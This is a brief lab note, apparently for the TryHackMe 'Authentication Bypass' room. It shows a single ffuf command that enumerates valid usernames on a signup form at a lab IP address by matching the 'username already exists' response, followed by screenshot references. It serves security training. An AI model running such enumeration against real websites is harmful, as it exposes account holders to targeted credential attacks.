https://tryhackme.com/room/authenticationbypass
command bellow will output all username that are a match in the wordlist provided (names.txt) 
           
`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.18.108/customers/signup -mr "username already exists"`


<figure><img src=".gitbook/assets/Captussre.JPG" alt=""><figcaption></figcaption></figure>

![Capture](https://github.com/user-attachments/assets/aaf91c04-0a23-4948-a1b5-d01b34b30dec)
